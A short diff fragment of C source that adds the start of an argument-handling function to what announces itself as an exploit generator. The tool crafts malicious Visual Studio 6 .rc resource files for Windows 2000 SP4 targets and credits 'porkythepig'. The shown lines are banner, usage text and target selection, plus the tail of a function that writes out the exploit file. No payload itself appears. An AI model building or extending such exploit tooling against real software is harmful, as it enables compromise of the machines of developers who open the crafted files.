@@ -174,3 +174,17 @@ void WriteBuffer()
 	fclose(o);
     printf("Output .rc file [ %s ] built successfully\n",outName);
 }
+void ProcessInput(int argc, char* argv[])
+{
+	printf("\nMicrosoft Visual Studio 6  .rc resource files exploit\n");
+	printf("Vulnerability found & exploit built by porkythepig\n");
+	
+	if(argc<3)
+	{
+		printf("Syntax: exploit.exe os outName\n");
+		printf("[os]        host OS, possible choices:\n");
+		printf("               0   Windows 2000 SP4 English\n"); 
+		printf("               1   Windows 2000 SP4 English all updates on day 11.01.2007\n");
+		printf("[outName]   output .rc exploit file name\n");
+		exit(0);
+	}
